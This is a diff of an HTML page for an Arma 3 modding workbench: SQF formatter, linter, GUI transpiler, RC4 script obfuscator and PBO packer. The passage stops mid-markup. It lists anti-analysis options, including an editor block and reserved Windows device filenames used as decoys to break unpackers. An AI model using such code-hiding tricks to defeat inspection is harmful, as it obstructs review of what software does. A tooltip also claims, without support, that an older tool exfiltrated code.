@@ -1,68 +1,2937 @@
-<!doctype html>
-<html>
-
+<!DOCTYPE html>
+<html lang="en" class="dark">
 <head>
-    <meta charset="utf-8"> 
-    <meta name="description" content="SQF Tools. The best Arma 3 tools out there!" />
-    <meta name="keywords" content="hpp to sqf, converter, sqf, beautifyer, rename variables, encrypt, decrypt, obfuscate, crypt, cryptkey, beautify, minify, arma 3, arma 2, ni1kko" />
-    <meta name="author" content="Ni1kko" />
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="shortcut icon" href="https://ni1kko.github.io/a3-webbased-tools/favicon.ico">
-    <title>Arma 3 SQF Converter</title> 
-    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300' rel='stylesheet' type='text/css'>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RV4 // Real Virtuality Engineering Workbench (Arma 3 x64 2.18+)</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts: JetBrains Mono & Space Grotesk & Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- GSAP for smooth tactical UI transitions -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <!-- Ace Editor -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/mode-c_cpp.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/theme-tomorrow_night_eighties.min.js"></script>
+
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        display: ['Space Grotesk', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        rv: {
+                            bg: '#090b0f',
+                            panel: '#10141d',
+                            surface: '#161c28',
+                            border: '#232c3d',
+                            amber: '#f59e0b',
+                            emerald: '#10b981',
+                            crimson: '#ef4444',
+                            cyan: '#06b6d4'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
     <style>
-        body{background-color:black;} 
-        #choose1{height:100vh;width:50vw;left:0;top:0;position:absolute;overflow:hidden;} 
-        #choose2{height:100vh;width:50vw;right:0;top:0;position:absolute;overflow:hidden;}
-
-        img{
-            height:100%;
-            transition:.5s;
-            opacity:.7;
-            -webkit-filter:blur(5px);
-            -moz-filter:blur(5px);
-            -o-filter:blur(5px);
-            -ms-filter:blur(5px);
-            filter:blur(5px);
+        /* Custom Tactical Scrollbars & Grid Background */
+        body {
+            background-color: #090b0f;
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(245, 158, 11, 0.06) 0%, transparent 60%),
+                linear-gradient(to right, rgba(35, 44, 61, 0.22) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(35, 44, 61, 0.22) 1px, transparent 1px);
+            background-size: 100% 100%, 32px 32px, 32px 32px;
+            color: #e2e8f0;
+            overflow-x: hidden;
         }
-
-        img:HOVER{
-            -webkit-filter:blur(0px);
-            -moz-filter:blur(0px);
-            -o-filter:blur(0px);
-            -ms-filter:blur(0px);
-            filter:blur(0px);
-            opacity:1;height:102%;
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
         }
-
-        h1{
-            color:white;
-            position:absolute;
-            font-family:'Open Sans', sans-serif;
-            font-weight:300;
-            font-size:50px;
-            text-shadow:0 0 5px black;
-            pointer-events:none;
-            margin:50px;
-            z-index:100;
+        ::-webkit-scrollbar-track {
+            background: #090b0f;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #232c3d;
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #f59e0b;
+        }
+        .ace_editor {
+            font-family: 'JetBrains Mono', monospace !important;
+            font-size: 13px !important;
+            line-height: 1.55 !important;
+            background-color: #0c0f16 !important;
+        }
+        .ace_gutter {
+            background-color: #10141d !important;
+            color: #64748b !important;
+            border-right: 1px solid #1e2636 !important;
+        }
+        .tactical-border {
+            position: relative;
+        }
+        .tactical-border::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 8px;
+            height: 8px;
+            border-top: 2px solid #f59e0b;
+            border-left: 2px solid #f59e0b;
+            pointer-events: none;
+        }
+        .tactical-border::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 8px;
+            height: 8px;
+            border-bottom: 2px solid #f59e0b;
+            border-right: 2px solid #f59e0b;
+            pointer-events: none;
         }
     </style>
 </head>
+<body class="min-h-screen flex flex-col selection:bg-amber-500/30 selection:text-amber-200">
 
-<body>
-    <div id="choose1">
-        <h1>Encrypter</h1>
-        <a href="encrypt.html">
-            <img src="https://ni1kko.github.io/a3-webbased-tools/img/1.png">
-        </a>
+    <!-- TOP TELEMETRY & NAVIGATION HEADER -->
+    <header class="sticky top-0 z-40 bg-rv-bg/95 backdrop-blur-md border-b border-rv-border">
+        <!-- Upper Sub-bar: System Status & Security Guarantees -->
+        <div class="px-4 py-1.5 bg-rv-panel border-b border-rv-border/70 flex flex-wrap items-center justify-between gap-2 text-[11px] font-mono">
+            <div class="flex items-center gap-3">
+                <span class="inline-flex items-center gap-1.5 text-amber-400 font-semibold">
+                    <span class="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
+                    RV4 ENGINE TARGET: ARMA 3 x64 (v2.18+)
+                </span>
+                <span class="hidden sm:inline text-slate-600">|</span>
+                <span class="hidden sm:inline-flex items-center gap-1 text-emerald-400">
+                    <i class="fa-solid fa-shield-halved"></i> IEEE-754 24-BIT INT SAFE
+                </span>
+                <span class="hidden md:inline text-slate-600">|</span>
+                <span class="hidden md:inline-flex items-center gap-1 text-cyan-400">
+                    <i class="fa-solid fa-cubes"></i> VFS PBO + \0raP BINARY STREAM
+                </span>
+            </div>
+            <div class="flex items-center gap-3">
+                <span class="px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/30 text-emerald-300" title="Unlike 2016 a3-webbased-tools which exfiltrated code to fallox.cloud, this workbench executes 100% locally in your browser.">
+                    <i class="fa-solid fa-lock mr-1"></i>ZERO EXFILTRATION (LOCAL SANDBOX)
+                </span>
+                <button onclick="openQuickHelpModal()" class="text-slate-400 hover:text-amber-400 transition-colors">
+                    <i class="fa-regular fa-circle-question mr-1"></i>Spec Sheet
+                </button>
+            </div>
+        </div>
+
+        <!-- Main Navigation Bar -->
+        <div class="max-w-[1600px] mx-auto px-4 py-3 flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-amber-500/20 to-amber-600/5 border border-amber-500/40 flex items-center justify-center text-amber-400 font-mono font-bold text-lg shadow-inner">
+                    RV4
+                </div>
+                <div>
+                    <div class="flex items-center gap-2">
+                        <h1 class="font-display font-bold text-lg tracking-tight text-white">REAL VIRTUALITY ENGINEERING WORKBENCH</h1>
+                        <span class="text-[10px] font-mono uppercase px-2 py-0.5 rounded bg-amber-500/15 text-amber-400 border border-amber-500/30">2026 Hardened Edition</span>
+                    </div>
+                    <p class="text-xs text-slate-400">AST-Aware SQF Studio, Pure-Integer RC4/sreV PBO Obfuscator, &amp; <code class="text-amber-300 font-mono">\0raP</code> Binary Decompiler</p>
+                </div>
+            </div>
+
+            <!-- 4 Main Workbench Tabs -->
+            <nav class="flex flex-wrap items-center gap-1.5 bg-rv-panel p-1.5 rounded-xl border border-rv-border w-full lg:w-auto">
+                <button onclick="switchWorkbench('studio')" id="tab-studio" class="wb-tab flex-1 lg:flex-initial px-3.5 py-2 rounded-lg text-xs font-mono font-medium transition-all flex items-center justify-center gap-2 bg-amber-500 text-slate-950 font-semibold shadow">
+                    <i class="fa-solid fa-code"></i>
+                    <span>1. SQF Studio &amp; Transpiler</span>
+                </button>
+                <button onclick="switchWorkbench('obfuscator')" id="tab-obfuscator" class="wb-tab flex-1 lg:flex-initial px-3.5 py-2 rounded-lg text-xs font-mono font-medium transition-all flex items-center justify-center gap-2 text-slate-300 hover:text-white hover:bg-rv-surface">
+                    <i class="fa-solid fa-vault"></i>
+                    <span>2. Hardened Obfuscator &amp; PBO</span>
+                </button>
+                <button onclick="switchWorkbench('rap')" id="tab-rap" class="wb-tab flex-1 lg:flex-initial px-3.5 py-2 rounded-lg text-xs font-mono font-medium transition-all flex items-center justify-center gap-2 text-slate-300 hover:text-white hover:bg-rv-surface">
+                    <i class="fa-solid fa-microchip"></i>
+                    <span>3. raP Binary &amp; SQM Exporter</span>
+                </button>
+                <button onclick="switchWorkbench('teardown')" id="tab-teardown" class="wb-tab flex-1 lg:flex-initial px-3.5 py-2 rounded-lg text-xs font-mono font-medium transition-all flex items-center justify-center gap-2 text-slate-300 hover:text-white hover:bg-rv-surface">
+                    <i class="fa-solid fa-bug-slash"></i>
+                    <span>4. 2016 Audit &amp; Float32 Lab</span>
+                </button>
+            </nav>
+        </div>
+    </header>
+
+    <!-- MAIN WORKSPACE CONTAINER -->
+    <main class="flex-1 max-w-[1600px] w-full mx-auto px-4 py-5 flex flex-col gap-5">
+
+        <!-- ========================================================================= -->
+        <!-- WORKBENCH 1: SQF STUDIO, AST FORMATTER, GUI TRANSPILER & STATIC LINTER   -->
+        <!-- ========================================================================= -->
+        <section id="wb-studio" class="workbench-panel flex flex-col gap-4">
+            <!-- Control Ribbon -->
+            <div class="bg-rv-panel border border-rv-border rounded-xl p-4 flex flex-col gap-3.5 shadow-lg">
+                <div class="flex flex-wrap items-center justify-between gap-3 border-b border-rv-border pb-3">
+                    <div class="flex flex-wrap items-center gap-2">
+                        <span class="text-xs font-mono uppercase tracking-wider text-amber-400 font-semibold mr-1">
+                            <i class="fa-solid fa-wand-magic-sparkles mr-1"></i>AST Operations:
+                        </span>
+                        <button onclick="runStudioOperation('beautify')" class="px-3 py-1.5 rounded-lg bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/30 text-xs font-mono font-medium transition flex items-center gap-1.5" title="Formats SQF indentation while keeping #define and #include directives on intact lines">
+                            <i class="fa-solid fa-align-left"></i> AST Beautifier (#define Safe)
+                        </button>
+                        <button onclick="runStudioOperation('minify')" class="px-3 py-1.5 rounded-lg bg-rv-surface hover:bg-slate-800 text-slate-200 border border-rv-border text-xs font-mono font-medium transition flex items-center gap-1.5" title=" Strips comments & whitespace without corrupting * or / operators or #define macros">
+                            <i class="fa-solid fa-compress"></i> Macro-Safe Minifier
+                        </button>
+                        <button onclick="runStudioOperation('stripComments')" class="px-3 py-1.5 rounded-lg bg-rv-surface hover:bg-slate-800 text-slate-200 border border-rv-border text-xs font-mono font-medium transition flex items-center gap-1.5">
+                            <i class="fa-solid fa-eraser"></i> Strip Comments
+                        </button>
+                        <div class="h-4 w-[1px] bg-rv-border mx-1 hidden sm:block"></div>
+                        <button onclick="runStudioOperation('hppToSqf')" class="px-3 py-1.5 rounded-lg bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-300 border border-cyan-500/30 text-xs font-mono font-medium transition flex items-center gap-1.5" title="Transpile Dialog HPP controls[] classes into runtime ctrlCreate SQF">
+                            <i class="fa-solid fa-window-restore"></i> HPP GUI &rarr; ctrlCreate SQF
+                        </button>
+                        <button onclick="runStudioOperation('sqfToHpp')" class="px-3 py-1.5 rounded-lg bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-300 border border-cyan-500/30 text-xs font-mono font-medium transition flex items-center gap-1.5" title="Reverse-transpile runtime ctrlCreate SQF back to a Dialog HPP Class">
+                            <i class="fa-solid fa-file-code"></i> ctrlCreate SQF &rarr; HPP Class
+                        </button>
+                        <div class="h-4 w-[1px] bg-rv-border mx-1 hidden sm:block"></div>
+                        <button onclick="runStudioOperation('renameLocal')" class="px-3 py-1.5 rounded-lg bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 text-xs font-mono font-medium transition flex items-center gap-1.5" title="Renames local _variables while preserving _this, _x, _forEachIndex, _thisEventHandler, etc.">
+                            <i class="fa-solid fa-tags"></i> Rename Local _Vars
+                        </button>
+                        <button onclick="runStudioOperation('renameGlobal')" class="px-3 py-1.5 rounded-lg bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 text-xs font-mono font-medium transition flex items-center gap-1.5">
+                            <i class="fa-solid fa-globe"></i> Rename Global Vars
+                        </button>
+                        <button onclick="runStudioOperation('decryptLegacy')" class="px-3 py-1.5 rounded-lg bg-purple-500/15 hover:bg-purple-500/25 text-purple-300 border border-purple-500/30 text-xs font-mono font-medium transition flex items-center gap-1.5" title="Auto-crack 2016 Iseco, SquareRoot, Unicode & SplitString payloads">
+                            <i class="fa-solid fa-unlock-keyhole"></i> Deobfuscate 2016 Payload
+                        </button>
+                    </div>
+
+                    <!-- Preset Loader -->
+                    <div class="flex items-center gap-2">
+                        <label class="text-xs font-mono text-slate-400">Load Preset:</label>
+                        <select id="studioPresetSelect" onchange="loadStudioPreset(this.value)" class="bg-rv-bg border border-rv-border rounded-lg px-2.5 py-1.5 text-xs font-mono text-amber-300 focus:outline-none focus:border-amber-500">
+                            <option value="sqf_macros">1. SQF Script + #define Macros + Linter Issues</option>
+                            <option value="hpp_gui">2. GUI Editor Dialog Class (RscControls)</option>
+                            <option value="iseco_2016">3. Legacy 2016 Iseco Encrypted Payload</option>
+                            <option value="minified_mess">4. Minified Obfuscated SQF One-Liner</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Parameter Bar -->
+                <div class="flex flex-wrap items-center justify-between gap-3 text-xs font-mono">
+                    <div class="flex flex-wrap items-center gap-3">
+                        <div class="flex items-center gap-2">
+                            <span class="text-slate-400">Display IDD / Prefix / Legacy Key:</span>
+                            <input id="studioParamInput" type="text" value="4600" placeholder="e.g. 4600, _loc, or Iseco Key" class="bg-rv-bg border border-rv-border rounded-lg px-3 py-1 text-xs font-mono text-white w-52 focus:outline-none focus:border-amber-500">
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <span class="text-slate-400">Protected Vars (comma-sep):</span>
+                            <input id="studioProtectedVars" type="text" value="life_cash, life_atmcash, BIS_fnc_MP" class="bg-rv-bg border border-rv-border rounded-lg px-3 py-1 text-xs font-mono text-slate-300 w-64 focus:outline-none focus:border-amber-500">
+                        </div>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <button onclick="runStaticLinter()" class="px-3 py-1 rounded-lg bg-rv-bg border border-amber-500/40 text-amber-300 hover:bg-amber-500/10 transition">
+                            <i class="fa-solid fa-stethoscope mr-1"></i>Re-Scan Static Linter
+                        </button>
+                        <button onclick="swapStudioEditors()" class="px-3 py-1 rounded-lg bg-rv-bg border border-rv-border text-slate-300 hover:text-white hover:border-slate-500 transition" title="Copy Output back to Input editor">
+                            <i class="fa-solid fa-right-left mr-1"></i>Output &rarr; Input
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Dual Split-Pane Ace Editors -->
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                <!-- Input Editor Pane -->
+                <div class="bg-rv-panel border border-rv-border rounded-xl overflow-hidden flex flex-col shadow-lg">
+                    <div class="px-4 py-2.5 bg-rv-surface border-b border-rv-border flex items-center justify-between">
+                        <div class="flex items-center gap-2">
+                            <span class="w-2.5 h-2.5 rounded-full bg-amber-400"></span>
+                            <span class="font-mono text-xs font-semibold text-white uppercase tracking-wider">Input Source Buffer (.sqf / .hpp)</span>
+                            <span id="inputTelemetry" class="text-[11px] font-mono text-slate-400 ml-2">0 B | 0 lines</span>
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <label class="cursor-pointer px-2.5 py-1 rounded bg-rv-bg hover:bg-slate-800 text-slate-300 border border-rv-border text-[11px] font-mono transition">
+                                <i class="fa-solid fa-upload mr-1"></i>Load File
+                                <input type="file" class="hidden" onchange="handleStudioFileUpload(event, 'input')">
+                            </label>
+                            <button onclick="clearEditor('input')" class="px-2.5 py-1 rounded bg-rv-bg hover:bg-red-950/50 text-slate-400 hover:text-red-300 border border-rv-border text-[11px] font-mono transition">
+                                Clear
+                            </button>
+                        </div>
+                    </div>
+                    <div id="aceStudioInput" class="w-full h-[430px]"></div>
+                </div>
+
+                <!-- Output Editor Pane -->
+                <div class="bg-rv-panel border border-rv-border rounded-xl overflow-hidden flex flex-col shadow-lg">
+                    <div class="px-4 py-2.5 bg-rv-surface border-b border-rv-border flex items-center justify-between">
+                        <div class="flex items-center gap-2">
+                            <span class="w-2.5 h-2.5 rounded-full bg-emerald-400"></span>
+                            <span class="font-mono text-xs font-semibold text-white uppercase tracking-wider">Transpiled / Formatted Output</span>
+                            <span id="outputTelemetry" class="text-[11px] font-mono text-slate-400 ml-2">0 B | 0 lines</span>
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <button onclick="copyEditorContent('output')" class="px-2.5 py-1 rounded bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 text-[11px] font-mono transition">
+                                <i class="fa-regular fa-copy mr-1"></i>Copy Output
+                            </button>
+                            <button onclick="downloadStudioOutput()" class="px-2.5 py-1 rounded bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/30 text-[11px] font-mono transition">
+                                <i class="fa-solid fa-download mr-1"></i>Download .sqf
+                            </button>
+                        </div>
+                    </div>
+                    <div id="aceStudioOutput" class="w-full h-[430px]"></div>
+                </div>
+            </div>
+
+            <!-- SQF Static Diagnostics Linter Panel -->
+            <div class="bg-rv-panel border border-rv-border rounded-xl overflow-hidden shadow-lg">
+                <div class="px-4 py-2.5 bg-rv-surface border-b border-rv-border flex flex-wrap items-center justify-between gap-2">
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-triangle-exclamation text-amber-400"></i>
+                        <h3 class="font-mono text-xs font-bold uppercase tracking-wider text-white">RV4 Static Diagnostics &amp; Scope Linter</h3>
+                        <span id="linterSummaryBadge" class="px-2 py-0.5 rounded text-[11px] font-mono bg-amber-500/15 text-amber-300 border border-amber-500/30">Scanning...</span>
+                    </div>
+                    <span class="text-[11px] font-mono text-slate-400">Checks: Unscoped Local Vars &bull; Unscheduled Suspension (`sleep`/`waitUntil`) &bull; Deprecated A2 Commands &bull; Macro Integrity</span>
+                </div>
+                <div class="max-h-56 overflow-y-auto">
+                    <table class="w-full text-left border-collapse font-mono text-xs">
+                        <thead>
+                            <tr class="border-b border-rv-border bg-rv-bg/60 text-slate-400 text-[11px] uppercase">
+                                <th class="py-2 px-4 w-24">Severity</th>
+                                <th class="py-2 px-4 w-20">Line</th>
+                                <th class="py-2 px-4 w-48">Category</th>
+                                <th class="py-2 px-4">Diagnostic Message &amp; Remediation</th>
+                            </tr>
+                        </thead>
+                        <tbody id="linterTableBody" class="divide-y divide-rv-border/50">
+                            <!-- Populated dynamically -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <!-- ========================================================================= -->
+        <!-- WORKBENCH 2: HARDENED OBFUSCATOR & BINARY .PBO VFS PACKER                 -->
+        <!-- ========================================================================= -->
+        <section id="wb-obfuscator" class="workbench-panel hidden flex-col gap-5">
+            <!-- Top Overview Banner -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-4">
+                <!-- Left 2 Cols: Polymorphic RC4-Drop256 Stream Engine Configuration -->
+                <div class="lg:col-span-2 bg-rv-panel border border-rv-border rounded-xl p-4 flex flex-col justify-between gap-4 shadow-lg">
+                    <div class="flex flex-wrap items-center justify-between gap-2 border-b border-rv-border pb-3">
+                        <div>
+                            <h2 class="font-display font-bold text-base text-white flex items-center gap-2">
+                                <i class="fa-solid fa-shield-virus text-amber-400"></i>
+                                Hardened RC4-Drop256 Pure-Integer Polymorphic Engine + Split-Key VFS .PBO Packer
+                            </h2>
+                            <p class="text-xs text-slate-400 mt-0.5">Zero IEEE-754 float rounding drift (strictly bounded $[0, 255]$ integer state), zero high-surrogate UTF-16 crashes, and header-bound `sreV` split key.</p>
+                        </div>
+                        <span id="obfRoundtripBadge" class="px-2.5 py-1 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 font-mono text-xs font-semibold">
+                            <i class="fa-solid fa-circle-check mr-1"></i>RV4 VM Math Verified
+                        </span>
+                    </div>
+
+                    <!-- Encryption Parameters Grid -->
+                    <div class="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-3 text-xs font-mono">
+                        <div>
+                            <label class="block text-slate-400 mb-1">Half-A Key (PBO `sreV` Header)</label>
+                            <div class="flex gap-1">
+                                <input id="obfKeyHalfA" type="text" value="rv4_9f8a72b1c4e0" oninput="runHardenedObfuscator()" class="w-full bg-rv-bg border border-rv-border rounded-lg px-2.5 py-1.5 text-amber-300 focus:outline-none focus:border-amber-500">
+                                <button onclick="randomizeObfKeys()" class="px-2 bg-rv-surface border border-rv-border rounded-lg text-slate-300 hover:text-amber-400" title="Generate new cryptographic split keys">
+                                    <i class="fa-solid fa-dice"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-slate-400 mb-1">Half-B Key (`@ServerKey` Stub)</label>
+                            <input id="obfKeyHalfB" type="text" value="sv_k39d01a8e5f2" oninput="runHardenedObfuscator()" class="w-full bg-rv-bg border border-rv-border rounded-lg px-2.5 py-1.5 text-emerald-300 focus:outline-none focus:border-emerald-500">
+                        </div>
+                        <div>
+                            <label class="block text-slate-400 mb-1">Polymorphic Token Alphabet</label>
+                            <select id="obfAlphabet" onchange="runHardenedObfuscator()" class="w-full bg-rv-bg border border-rv-border rounded-lg px-2.5 py-1.5 text-white focus:outline-none focus:border-amber-500">
+                                <option value="il1">Il1 Optical Confusion (_Il1I1l)</option>
+                                <option value="o0">O0o Optical Confusion (_O0oO0o)</option>
+                                <option value="hex">Tactical Hex (_0x8F2A)</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-slate-400 mb-1">Optional UID / World Lock</label>
+                            <input id="obfLockTarget" type="text" placeholder="Steam64 UID or WorldName (optional)" oninput="runHardenedObfuscator()" class="w-full bg-rv-bg border border-rv-border rounded-lg px-2.5 py-1.5 text-cyan-300 focus:outline-none focus:border-cyan-500">
+                        </div>
+                    </div>
+
+                    <!-- Checkboxes for Runtime Guards -->
+                    <div class="flex flex-wrap items-center justify-between gap-3 pt-2 border-t border-rv-border/60 text-xs font-mono">
+                        <div class="flex flex-wrap items-center gap-4">
+                            <label class="inline-flex items-center gap-2 cursor-pointer text-slate-300">
+                                <input id="guardAnti3DEN" type="checkbox" checked onchange="runHardenedObfuscator()" class="accent-amber-500 rounded">
+                                <span>Block Eden Editor (`!is3DEN`)</span>
+                            </label>
+                            <label class="inline-flex items-center gap-2 cursor-pointer text-slate-300">
+                                <input id="guardCompileFinal" type="checkbox" checked onchange="runHardenedObfuscator()" class="accent-amber-500 rounded">
+                                <span>`compileFinal` + Key Memory Wipe</span>
+                            </label>
+                            <label class="inline-flex items-center gap-2 cursor-pointer text-slate-300">
+                                <input id="guardNtDecoys" type="checkbox" checked onchange="rebuildBinaryPboPreview()" class="accent-amber-500 rounded">
+                                <span>Inject Anti-BankRev NT Device Decoys (`AUX.sqf`, `COM1.fsm`)</span>
+                            </label>
+                        </div>
+                        <button onclick="runHardenedObfuscator()" class="px-4 py-1.5 rounded-lg bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold transition shadow">
+                            <i class="fa-solid fa-bolt mr-1"></i>Re-Compile Polymorphic Stream
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Right Col: Binary PBO VFS Quick-Export Card -->
+                <div class="bg-rv-panel border border-rv-border rounded-xl p-4 flex flex-col justify-between gap-3 shadow-lg tactical-border">
+                    <div>
+                        <div class="flex items-center justify-between">
+                            <span class="text-xs font-mono uppercase tracking-wider text-amber-400 font-bold">Binary VFS PBO Archive</span>
+                            <span id="pboSizeBadge" class="text-xs font-mono px-2 py-0.5 rounded bg-rv-surface text-cyan-300 border border-rv-border">0 Bytes</span>
+                        </div>
+                        <p class="text-xs text-slate-400 mt-1">Packs virtual `.sqf`/`.cpp` files into a valid Bohemia `.pbo` with `sreV` extended header properties, NT device decoys, and a 20-byte SHA-1 trailer.</p>
+                    </div>
+
+                    <div class="bg-rv-bg/80 border border-rv-border rounded-lg p-2.5 font-mono text-[11px] space-y-1">
+                        <div class="flex justify-between">
+                            <span class="text-slate-400">PBO Prefix (`sreV`):</span>
+                            <input id="pboPrefixInput" type="text" value="x\rv_protected\addons\core" oninput="rebuildBinaryPboPreview()" class="bg-transparent text-right text-amber-300 focus:outline-none border-b border-dashed border-slate-700 w-48">
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-slate-400">Header Property Key:</span>
+                            <span class="text-emerald-400">svn_rev = <span id="pboHeaderKeyPreview">rv4_9f8a72b1c4e0</span></span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-slate-400">SHA-1 Checksum Trailer:</span>
+                            <span id="pboSha1Preview" class="text-cyan-400 truncate max-w-[180px]">Computing...</span>
+                        </div>
+                    </div>
+
+                    <div class="flex flex-wrap items-center gap-2">
+                        <button onclick="downloadCompiledPbo()" class="flex-1 py-2 px-3 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-mono text-xs font-bold transition flex items-center justify-center gap-1.5 shadow">
+                            <i class="fa-solid fa-box-archive"></i> Download Hardened .PBO
+                        </button>
+                        <label class="cursor-pointer py-2 px-3 rounded-lg bg-rv-surface hover:bg-slate-800 text-slate-200 border border-rv-border font-mono text-xs transition flex items-center justify-center gap-1.5" title="Inspect & unpack any existing Arma 3 .pbo file">
+                            <i class="fa-solid fa-folder-open text-amber-400"></i> Inspect .PBO
+                            <input type="file" accept=".pbo" class="hidden" onchange="handlePboFileUpload(event)">
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Middle Editors: Virtual File Manager + Input SQF + Generated Hardened Output -->
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-4">
+                <!-- Virtual PBO File Tree (3 Cols) -->
+                <div class="lg:col-span-3 bg-rv-panel border border-rv-border rounded-xl overflow-hidden flex flex-col shadow-lg">
+                    <div class="px-3.5 py-2.5 bg-rv-surface border-b border-rv-border flex items-center justify-between">
+                        <span class="font-mono text-xs font-semibold text-white uppercase"><i class="fa-solid fa-folder-tree text-amber-400 mr-1.5"></i>VFS File Table</span>
+                        <button onclick="addVirtualPboFile()" class="px-2 py-0.5 rounded bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/30 text-[11px] font-mono">
+                            + Add File
+                        </button>
+                    </div>
+                    <!-- New file input bar (inline, no prompt/alert) -->
+                    <div id="newVfsFileBar" class="hidden p-2 bg-rv-bg border-b border-rv-border flex items-center gap-1.5">
+                        <input id="newVfsFileName" type="text" placeholder="functions\fn_myScript.sqf" class="flex-1 bg-rv-panel border border-rv-border rounded px-2 py-1 text-xs font-mono text-white">
+                        <button onclick="confirmAddVirtualPboFile()" class="px-2 py-1 rounded bg-emerald-500 text-slate-950 font-mono text-xs font-bold">Add</button>
+                    </div>
+                    <div id="vfsFileList" class="flex-1 divide-y divide-rv-border/50 overflow-y-auto max-h-[380px] font-mono text-xs">
+                        <!-- Populated dynamically -->
+                    </div>
+                    <div class="p-3 bg-rv-bg/60 border-t border-rv-border text-[11px] font-mono text-slate-400">
+                        <div><i class="fa-solid fa-circle-info text-amber-400 mr-1"></i>Click any VFS file to edit its source. All `.sqf` files are automatically stream-encrypted when packing the binary `.pbo`.</div>
+                    </div>
+                </div>
+
+                <!-- Plaintext VFS Source Editor (4 Cols) -->
+                <div class="lg:col-span-4 bg-rv-panel border border-rv-border rounded-xl overflow-hidden flex flex-col shadow-lg">
+                    <div class="px-3.5 py-2.5 bg-rv-surface border-b border-rv-border flex items-center justify-between">
+                        <div class="flex items-center gap-2">
+                            <span class="w-2 h-2 rounded-full bg-amber-400"></span>
+                            <span id="activeVfsFileTitle" class="font-mono text-xs font-semibold text-white">functions\fn_clientInit.sqf</span>
+                        </div>
+                        <span class="text-[11px] font-mono text-slate-400">Raw Source</span>
+                    </div>
+                    <div id="aceObfInput" class="w-full h-[390px]"></div>
+                </div>
+
+                <!-- Polymorphic Encrypted Output & Server PreInit Bootstrapper (5 Cols) -->
+                <div class="lg:col-span-5 bg-rv-panel border border-rv-border rounded-xl overflow-hidden flex flex-col shadow-lg">
+                    <div class="px-3.5 py-2 bg-rv-surface border-b border-rv-border flex flex-wrap items-center justify-between gap-2">
+                        <div class="flex items-center gap-1.5">
+                            <button onclick="switchObfOutputView('standalone')" id="btnObfViewStandalone" class="px-2.5 py-1 rounded text-[11px] font-mono font-semibold bg-amber-500 text-slate-950">
+                                Standalone Hardened .SQF
+                            </button>
+                            <button onclick="switchObfOutputView('serverstub')" id="btnObfViewServerStub" class="px-2.5 py-1 rounded text-[11px] font-mono text-slate-300 hover:bg-rv-bg">
+                                @ServerKey preInit Bootstrapper
+                            </button>
+                        </div>
+                        <button onclick="copyObfOutput()" class="px-2.5 py-1 rounded bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 text-[11px] font-mono">
